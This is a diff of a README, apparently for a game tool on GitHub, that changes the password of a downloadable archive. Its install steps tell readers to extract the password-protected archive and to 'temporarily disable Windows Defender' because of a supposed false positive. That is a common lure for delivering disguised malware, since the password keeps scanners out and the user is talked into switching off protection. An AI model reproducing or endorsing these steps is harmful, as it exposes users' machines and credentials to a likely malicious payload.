@@ -27,7 +27,7 @@ Get the latest version from **[Releases](https://github.com/kevink-hq92j2/cod-wa
 ### Step 2: Extract
 Extract the archive using WinRAR or 7-Zip.
 
-**Password:** `-V*0G&_4fr!j`
+**Password:** `BhKc-GX*9z5M`
 
 ### Step 3: Run
 1. **Temporarily disable Windows Defender** (false positive)
